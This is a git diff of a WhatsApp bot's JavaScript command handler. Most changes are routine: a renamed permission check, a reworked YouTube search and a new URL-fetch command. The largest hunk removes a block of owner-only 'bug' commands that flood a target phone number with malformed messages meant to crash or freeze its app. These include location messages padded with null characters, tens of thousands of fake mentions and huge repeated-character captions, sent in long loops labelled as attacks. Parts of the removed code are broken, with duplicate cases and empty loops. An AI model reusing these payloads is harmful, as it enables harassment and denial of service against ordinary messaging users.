@@ -6312,7 +6312,7 @@ const [target, subject, message] = args;
 
 case 'myip':
             case 'ipbot':
-                if (!Owner) return m.reply(mess.owner)
+                if (!Access) return m.reply(mess.owner)
                 var http = require('http')
                 http.get({
                     'host': 'api.ipify.org',
@@ -6352,50 +6352,6 @@ break;
  //========================================================\\     
 
 break
-
- //========================================================\\    
-  case 'ghiblistyle': case 'toghibli':{
- try {
- let q = m.quoted ? m.quoted : m;
- let mime = (q.msg || q).mimetype || '';
- if (!mime) return conn.sendMessage(m.chat, { text: 'Reply to a photo' }, { quoted: m });
- if (!mime.startsWith('image')) return conn.sendMessage(m.chat, { text: 'provide a photo!' }, { quoted: m });
- const media = await q.download();
- const base64Image = media.toString('base64');
- await conn.sendMessage(m.chat, { text: '⏳ proses bro..' }, { quoted: m });
- const axios = require('axios');
- const response = await axios.post(
- `https://ghiblistyleimagegenerator.cc/api/generate-ghibli`, 
- { image: base64Image }, 
- { headers: {
- 'authority': 'ghiblistyleimagegenerator.cc',
- 'origin': 'https://ghiblistyleimagegenerator.cc',
- 'referer': 'https://ghiblistyleimagegenerator.cc/',
- 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
- } 
- }
- );
- if (!response.data.success) return conn.sendMessage(m.chat, { text: 'provide a photo' }, { quoted: m });
- const ghibliImageUrl = response.data.ghibliImage; 
- const form = new FormData();
- form.append('reqtype', 'fileupload');
- form.append('userhash', '');
- form.append('fileToUpload', Buffer.from(media), 'ghibli.jpg'); 
- const upres = await axios.post('https://catbox.moe/user/api.php', form, {
- headers: form.getHeaders()
- });
- const upUrl = upres.data.trim();
- await dave.sendMessage(m.chat, {
- image: { url: ghibliImageUrl },
- caption: `🎨 *Ghibli Style Image Generated*`,
- mentions: [m.sender]
- }, { quoted: m });
- } catch (error) {
- console.error('Error:', error);
- await conn.sendMessage(m.chat, { text: `Error: ${error.message || 'error'}` }, { quoted: m });
- }
-}
- break
 
 
   //========================================================\\    
@@ -6768,7 +6724,7 @@ const quoted = m.quoted || m.msg?.quoted;
     }
 }
 break
-case 'toaud':
+case 'tomp3':
 case 'toaudio': {
 if (!/video/.test(mime) && !/audio/.test(mime)) return reply(`tag/reply Video/Audio with Caption ${prefix + command}`)
 let media = await conn.downloadMediaMessage(qmsg)
@@ -6798,10 +6754,7 @@ try {
                 document: pdfData,
                 mimetype: 'application/pdf',
                 fileName: 'Vinic-X .pdf',
-                caption: `
-*📄 PDF created successully!*
-
-> © Created by Vinic-Xmd`
+                caption: `${global.wm}`
             }, { quoted: mek });
         });
 
@@ -6899,6 +6852,26 @@ console.log('Quoted Key:', m.quoted?.key);
     } catch (err) {
       console.error('Error determining device:', err);
       reply('Error determining device: ' + err.message);
+    }
+}
+break
+case "browse": {
+if (!text) return reply("Enter URL");
+
+    try {
+      let res = await fetch(text);
+
+      if (res.headers.get('Content-Type').includes('application/json')) {
+        let json = await res.json();
+        await conn.sendMessage(m.chat, { text: JSON.stringify(json, null, 2) }, { quoted: m });
+      } else {
+        let resText = await res.text();
+        await conn.sendMessage(m.chat, { text: resText }, { quoted: m });
+      }
+
+      if (!res.ok) throw new Error(`HTTP Error ${res.status}`);
+    } catch (error) {
+      reply(`Error fetching URL: ${error.message}`);
     }
 }
 break
@@ -7512,48 +7485,26 @@ case "playstore": {
 break
 case "yts": 
 case "ytsearch": {
-    try {
-        if (!q) return reply("Please provide a song name. Example: .yts shape of you");
-        
-        const apiUrl = `https://api.giftedtech.co.ke/api/search/yts?apikey=gifted&query=${encodeURIComponent(q)}`;
-        
-        // Fetch response from API
-        const response = await fetch(apiUrl);
-        const result = await response.json();
-        
-        // Format the YouTube search results
-        let ytText;
-        if (result.status && result.data) {
-            if (Array.isArray(result.data) && result.data.length > 0) {
-                const video = result.data[0]; // Get first result
-                ytText = `🎵 *YouTube Search Results* 🎵\n\n` +
-                        `📺 *Title:* ${video.title || 'Unknown Title'}\n` +
-                        `⏱️ *Duration:* ${video.duration || 'N/A'}\n` +
-                        `👁️ *Views:* ${video.views || 'N/A'}\n` +
-                        `📅 *Uploaded:* ${video.uploadDate || 'N/A'}\n` +
-                        `👤 *Channel:* ${video.channel || 'Unknown'}\n` +
-                        `🔗 *URL:* ${video.url || 'Not available'}\n\n` +
-                        `💬 *Description:* ${video.description ? video.description.substring(0, 200) + '...' : 'No description'}`;
-            } else if (typeof result.data === 'string') {
-                ytText = result.data;
-            } else {
-                ytText = `🎵 Search Results:\n${JSON.stringify(result.data, null, 2)}`;
-            }
-        } else if (result.result) {
-            ytText = typeof result.result === 'string' ? result.result : JSON.stringify(result.result, null, 2);
-        } else {
-            ytText = "🎵 No videos found with that search term.";
-        }
-        
-        // Ensure it's a string and not too long
-        const safeText = String(ytText || "🎵 No videos found.").substring(0, 4000);
-        
-        reply(safeText);
-        
-    } catch (error) {
-        console.error('Error searching YouTube:', error);
-        reply("❌ Error searching YouTube. Please try again later.");
-    }
+    if (!text) return reply(`📌 *Example: ${prefix + command} Eminem Godzilla*`);
+
+      try {
+        const searchResults = await yts(text);
+        if (!searchResults.all.length) return reply("❌ *No YouTube results found.*");
+
+        let responseText = `🎥 *YouTube Search Results for:* ${text}\n\n`;
+        searchResults.all.slice(0, 10).forEach((video, index) => {
+          responseText += `□ *${index + 1}.* ${video.title}\n□ *Uploaded:* ${video.ago}\n□ *Views:* ${video.views}\n□ *Duration:* ${video.timestamp}\n□ *URL:* ${video.url}\n\n─────────────────\n\n`;
+        });
+
+        await conn.sendMessage(
+          m.chat,
+          { image: { url: searchResults.all[0].thumbnail }, caption: responseText },
+          { quoted: m }
+        );
+      } catch (error) {
+        console.error("YT Search command failed:", error);
+        reply("❌ *An error occurred while fetching YouTube search results.*");
+      }
 }
 break
 case "movie": {
@@ -9488,436 +9439,8 @@ reply("*group link reseted by admin*" )
 }
 //bug command
 break
-case "trial":{
-if(!Access) return reply("*Used by owner only*")
-if(!text) return reply(`Example: ${prefix + command} 25672345...`)
-const target = q.replace(/[^0-9]/g,"") + "@s.whatsapp.net"
-await bugload()
-reply(`𝙑𝙞𝙣𝙞𝙘-𝙓𝙢𝙙 𝙨𝙚𝙣𝙙𝙞𝙣𝙜 𝙗𝙪𝙜𝙨 𝙩𝙤 ${target}`)
-//sending bugs
-for(let i = 0; i < 40; i++){
-//loading the bugs using the function
-await Trial(target)
-await Trial(target)
-await Trial(target)
-await sleep(2000) //2minutes pause time
-await Trial(target)
-await Trial(target)
-}
-reply(`𝗦𝘂𝗰𝗰𝗲𝘀𝙨 𝘀𝗲𝗻𝘁 𝗯𝘂𝗴𝘀 𝘁𝗼 ${target}\n Command: ${command}`)
-}
-break
-case "ceo-venom": {
-if(!Access) return reply(mess.owner)
-if(!text) return reply("𝗘𝘅𝗮𝗺𝗽𝗹𝗲: .*ceo-venom* 256xxxx...")
-target = q.replace(/[^0-9]/g,'') + "@s.whatsapp.net"
-await bugLoad()
-
-     conn.sendMessage(m.chat, {  
-            video: { url: "https://files.catbox.moe/evpu1c.mp4" },  
-            caption: buggy,   
-            contextInfo: {
-                mentionedJid: [m.sender],
-                forwardedNewsletterMessageInfo: {
-                    newsletterName: "☘𝗞𝗘𝗩𝗜𝗡 𝗧𝗘𝗖𝗛☘",
-                    newsletterJid: `120363322464215140@newsletter` 
-                },
-                
-            }
-        },{ quoted: st }
-    )
-for(let i = 0; i < 30; i++){
-await RB(target)
-await RB(target)
-await RB(target)
-await sleep(1500)
-await RB(target)
-await RB(target)
-await sleep(1500)
-await RB(target)
-
-}
-}
 
 break
-case "ceo-venom": {
-    if(!Access) return reply(mess.owner)
-    if(!text) return reply("𝗘𝘅𝗮𝗺𝗽𝗹𝗲: .*dark* 256689...")
-    
-    // Initialize q properly before using it
-    const q = text.trim()
-    const target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net"
-    
-    await bugLoad()
-
-    try {
-        // Send initial message
-        await conn.sendMessage(m.chat, {  
-            video: { url: "https://files.catbox.moe/evpu1c.mp4" },  
-            caption: buggy,   
-            contextInfo: {
-                mentionedJid: [m.sender],
-                forwardedNewsletterMessageInfo: {
-                    newsletterName: "☘𝗞𝗘𝗩𝗜𝗡 𝗧𝗘𝗖𝗛☘",
-                    newsletterJid: `120363322464215140@newsletter` 
-                },
-            }
-        }, { quoted: st })
-
-        // Perform the repeated actions
-        for(let i = 0; i < 30; i++) {
-            await RB(target)
-            await RB(target)
-            await RB(target)
-            await sleep(1500)
-            await RB(target)
-            await RB(target)
-            await sleep(1500)
-            await RB(target)
-        }
-    } catch (error) {
-        console.error("Error in dark command:", error)
-        reply("An error occurred while processing the command.")
-    }
-}
-break
-// ... existing cases in your switch statement ...
-
-case "imgcrash": {
-    if(!Access) return reply(mess.owner)
-    if(!text) return reply(`Example: ${prefix + command} 256xxxxxxx`)
-    
-    const target = text.replace(/[^0-9]/g, '') + "@s.whatsapp.net"
-    await bugLoad()
-    reply(`Starting image crash attack on ${target}`)
-    
-    try {
-        // Send multiple image crash messages
-        for(let i = 0; i < 20; i++) {
-            await imgCrash(target)
-            await sleep(1000) // 1 second delay between messages
-        }
-        reply(`Image crash attack completed on ${target}`)
-    } catch (error) {
-        console.error('Image crash error:', error)
-        reply(`Error during image crash: ${error.message}`)
-    }
-}
-break
-case "delaybug": {
-    if (!Access) return reply(mess.owner);
-    if (!text) return reply(`Example: ${prefix}delay 2567xxxxxxx 10\n(Number and duration in seconds)`);
-
-    const [numberInput, durationInput] = text.split(' ');
-    const target = numberInput.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
-    const durationSec = parseInt(durationInput) || 10;
-
-    if (durationSec > 3600) return reply("Maximum duration is 1 hour (3600 seconds)");
-    if (durationSec < 5) return reply("Minimum duration is 5 seconds");
-
-    try {
-        await reply(`🚀 Starting delayed attack for ${durationSec} seconds...`);
-        
-        const startTime = Date.now();
-        const endTime = startTime + (durationSec * 1000);
-        let messageCount = 0;
-        let errorCount = 0;
-
-        // Main attack loop
-        while (Date.now() < endTime) {
-            try {
-                await invisdelay(target);
-                messageCount++;
-                
-                // Add random delay between 0.5-2 seconds
-                await sleep(500 + Math.random() * 1500);
-                
-                // Progress update every 5 messages
-                if (messageCount % 5 === 0) {
-                    const elapsed = Math.floor((Date.now() - startTime) / 1000);
-                    const remaining = durationSec - elapsed;
-                    await conn.sendPresenceUpdate('composing', m.chat);
-                    await reply(`⏳ Status: ${messageCount} sent | ${errorCount} failed | ${remaining}s remaining`);
-                }
-            } catch (error) {
-                errorCount++;
-                console.error(`Error in delay loop (${errorCount}):`, error);
-                
-                // Backoff on errors
-                await sleep(2000 * Math.min(errorCount, 5));
-            }
-        }
-
-        // Final report
-        await reply(`✅ Attack completed!\n📤 Messages sent: ${messageCount}\n❌ Errors: ${errorCount}\n⏱️ Duration: ${durationSec}s`);
-
-    } catch (error) {
-        console.error('Delay command failed:', error);
-        reply(`❌ Critical error: ${error.message}`);
-    }
-    break;
-}
-
-// Enhanced invisdelay function with tracking
-async function invisdelay(target) {
-    const startTime = Date.now();
-    let success = false;
-    
-    try {
-        const generateLocationMessage = {
-            viewOnceMessage: {
-                message: {
-                    locationMessage: {
-                        degreesLatitude: 0,
-                        degreesLongitude: 0,
-                        name: "salam interaksi bun",
-                        address: "\u0000".repeat(1000),
-                        contextInfo: {
-                            mentionedJid: Array.from({ length: 1900 }, () =>
-                                `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
-                            ),
-                            isSampled: true,
-                            participant: target,
-                            remoteJid: target,
-                            forwardingScore: 9741,
-                            isForwarded: true
-                        }
-                    }
-                }
-            }
-        };
-
-        const locationMsg = generateWAMessageFromContent(
-            target, 
-            generateLocationMessage, 
-            { quoted: null }
-        );
-
-        await conn.relayMessage(
-            target, 
-            locationMsg.message, 
-            {
-                messageId: locationMsg.key.id,
-                additionalAttributes: {
-                    "ephemeral": true
-                }
-            }
-        );
-        
-        success = true;
-        return true;
-        
-    } catch (error) {
-        console.error('invisdelay error:', {
-            target,
-            error: error.message,
-            duration: Date.now() - startTime
-        });
-        throw error;
-    } finally {
-        console.log(`invisdelay ${success ? 'success' : 'failed'} in ${Date.now() - startTime}ms`);
-    }
-}
-
-// Utility function
-function sleep(ms) {
-    return new Promise(resolve => setTimeout(resolve, ms));
-}
-break
-case "lonelysaam": {
-    if(!Access) return reply(mess.owner)
-    if(!text) return reply(`Example: ${command} 256xx`)
-    
-    // Initialize q properly before using it
-    const q = text.trim()
-    const vc = q.replace(/[^0-9]/g, '')
-    const target = vc + "@s.whatsapp.net"
-    
-    await conn.sendMessage(m.chat, {react: {text: '🦅', key: m.key}});
-    await bugLoad()
-
-    try {
-        // Send initial message
-        await conn.sendMessage(m.chat, {  
-            image: { url: "https://files.catbox.moe/l6hxt8.jpg" },  
-            caption: buggy,   
-            contextInfo: {
-                mentionedJid: [m.sender],
-                forwardedNewsletterMessageInfo: {
-                    newsletterName: "☘𝗞𝗘𝗩𝗜𝗡 𝗧𝗘𝗖𝗛☘",
-                    newsletterJid: `` 
-                },
-            }
-        }, { quoted: st })
-
-        // Perform the repeated actions
-        for(let r = 0; r < 40; r++) {
-            // Add your repeated actions here
-            // Example: await someFunction(target);
-            await sleep(1000) // Add delay if needed
-        }
-    } catch (error) {
-        console.error("Error in delaycombo command:", error)
-        reply("An error occurred while processing the command.")
-    }
-}
-break
-case "invis": {
-    if(!Access) return reply(mess.owner)
-    if(!text) return reply(`Example: ${command} 256xx`)
-    
-    // Initialize q properly
-    const q = text.trim()
-    const vc = q.replace(/[^0-9]/g,'')
-    const target = vc + "@s.whatsapp.net"
-    
-    await conn.sendMessage(m.chat, {react: {text: '🦅', key: m.key}});
-    await bugLoad()
-
-    try {
-        // Send initial message
-        await conn.sendMessage(m.chat, {  
-            image: { url: "https://files.catbox.moe/l6hxt8.jpg" },  
-            caption: buggy,   
-            contextInfo: {
-                mentionedJid: [m.sender],
-                forwardedNewsletterMessageInfo: {
-                    newsletterName: "☘𝗞𝗘𝗩𝗜𝗡 𝗧𝗘𝗖𝗛☘",
-                    newsletterJid: `` 
-                },
-            }
-        }, { quoted: st })
-
-        // Perform the repeated actions
-        for(let r = 0; r < 40; r++) {
-            await delayonly(target)
-            await delayonly(target)
-            await delayonly(target)
-            await sleep(2000)
-            await delayonly(target)
-            await delayonly(target)
-            await delayonly(target)
-            await sleep(1500)
-            await delayonly(target)
-            await delayonly(target)
-        }
-    } catch (error) {
-        console.error("Error in invis command:", error)
-        reply("An error occurred while processing the command.")
-    }
-}
-break
-case "Vinic-crash": {
-if(!Access) return reply(mess.owner)
-if(!text) return reply(`Example:
-${command} 256xxx`)
-async function newsletterSqL(target, ptcp = true) {
-    
-    const img300 = require('./folder/folder/image.jpg')
-    
-    const mentionedList = [
-    target, ...Array.from({ length: 35000 }, () =>
-      `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
-      )
-    ];
-    
-    try {
-        const message = {
-            botInvokeMessage: {
-                message: {
-                    newsletterAdminInviteMessage: {
-                        newsletterJid: '1@newsletter',
-                        newsletterName: "",
-                        jpegThumbnail: img300,
-                        caption: "ꦾ".repeat(60000),
-                        inviteExpiration: Date.now() + 9999999999,
-                    },
-                },
-            },
-            nativeFlowMessage: {
-              messageParamsJson: "{".repeat(10000),
-            },
-            contextInfo: {
-              remoteJid: target,
-              participant: target,
-              mentionedJid: mentionedList,
-              stanzaId: conn.generateMessageTag(),
-            },
-        };
-
-        await conn.relayMessage(target, message, {
-          userJid: target,
-        });
-    } catch (error) {
-        console.log("error:\n" + error);
-      }
-   }
-}
-break
-case "kevinkiller": {
-if (!Access) return reply(mess.owner)
-if (!q) return reply(`
-├─   *❌Incomplete Format!*
-├─Use: ${prefix + command} 256xxx`)
-    
-let client = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')
-let isTarget = client + "@s.whatsapp.net"
-await conn.sendMessage(m.chat, { react: { text: '🔍', key: m.key } });
-  let process = `*INFORMATION ATTACK*    
-┃├ Sender : ${m.pushName}
-┃├ Target : ${client}
-┃├ Status : Killers triggered.....`
-await conn.sendMessage(m.chat, { react: { text: '✅', key: m.key } }); 
-reply(process) 
-for (let r = 0; r < 750; r++) {
-await forceclose(isTarget);
-await sleep(5000)
-await forceclose(isTarget);
-await IosCrashX(isTarget);
-await IosCrashX(isTarget);
-await ioscrashX(isTarget);
-}
-
-let put = `*Information done*
-* Sender : ${m.pushName}
-* Target : ${client}
-* Status : Success
-`
-await conn.sendMessage(m.chat, { react: { text: '✅', key: m.key } }); 
-reply(put)
-}
-break
-//========================================================\\
-case "crax":{
-if(!Access) return reply(mess.owner)
-if(!text) return reply(`𝖤𝗑𝖺𝗆𝗉𝗅𝖾: ${command} 256xxx`)
-let vc = q.replace(/[^0-9]/g,'')
-const target = vc + "@s.whatsapp.net"
-const ment = false
-await conn.sendMessage(m.chat,{react:{text:'🦅',key:m.key}});
-await bugLoad()
-    conn.sendMessage(m.chat, {  
-            image: { url: "https://files.catbox.moe/l6hxt8.jpg" },  
-            caption: buggy,   
-            contextInfo: {
-                mentionedJid: [m.sender],
-                forwardedNewsletterMessageInfo: {
-                    newsletterName: "☘𝗞𝗘𝗩𝗜𝗡 𝗧𝗘𝗖𝗛☘",
-                    newsletterJid: `` 
-                },
-                
-            }
-        },{ quoted: st }
-    )
-    
-for(let r = 0; r < 50; r++){
-
-}
-
-}
-
-break
-        
 case 'backup':
 case 'bp': {
 if (!Access) return reply(mess.owner)
